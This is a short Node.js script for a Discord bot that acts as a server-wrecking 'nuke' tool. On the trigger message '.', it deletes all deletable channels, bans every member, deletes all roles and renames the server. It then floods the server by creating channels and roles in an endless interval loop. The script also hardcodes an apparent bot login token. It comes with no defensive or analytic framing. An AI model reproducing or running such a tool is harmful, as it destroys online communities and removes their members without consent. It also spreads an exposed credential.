const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "bayservar";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("bayservar");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("bayservar", "text");///////bo channel 
        message.guild.createChannel("bayservar", "voice");////bo voice
        message.guild.createRole({ name: "bayservar" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTE1MTU2NDU3NDAwNDUxMDgz.YaXf3g.CK-yrRg_6md79yUdbCOLHwHJkiA")

////Respect Up////
